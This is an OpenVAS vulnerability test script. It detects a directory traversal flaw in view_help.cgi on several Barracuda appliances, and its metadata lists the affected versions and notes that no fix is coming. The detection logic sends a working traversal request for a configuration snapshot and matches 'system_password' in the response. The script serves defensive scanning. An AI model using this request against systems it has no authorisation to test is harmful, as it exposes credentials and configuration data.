###############################################################################
# OpenVAS Vulnerability Test
#
# Barracuda Networks Multiple Products 'view_help.cgi' Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100847");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2010-10-06 12:55:58 +0200 (Wed, 06 Oct 2010)");
  script_bugtraq_id(43520);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Barracuda Networks Multiple Products 'view_help.cgi' Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43520");
  script_xref(name:"URL", value:"http://www.barracudanetworks.com/ns/?L=en_ca");
  script_xref(name:"URL", value:"http://www.barracudanetworks.com/ns/support/tech_alert.php");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8000);
  script_require_keys("BarracudaHTTP/banner");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Multiple Barracuda Networks products are prone to a directory-
  traversal vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker can exploit this vulnerability using directory-
  traversal characters ('../') to access files that contain sensitive
  information that can aid in further attacks.");

  script_tag(name:"affected", value:"Barracuda IM Firewall 3.4.01.004 and earlier

  Barracuda Link Balancer 2.1.1.010 and earlier

  Barracuda Load Balancer 3.3.1.005 and earlier

  Barracuda Message Archiver 2.2.1.005 and earlier

  Barracuda Spam & Virus Firewall 4.1.2.006 and earlier

  Barracuda SSL VPN 1.7.2.004 and earlier

  Barracuda Web Application Firewall 7.4.0.022 and earlier

  Barracuda Web Filter 4.3.0.013 and earlier");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir (make_list("/cgi-mod","/cgi-bin")) {

  url = dir + "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";
  if(http_vuln_check(port:port, url:url,pattern:"system_password",extra_check:make_list("system_netmask","system_default_domain"))) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);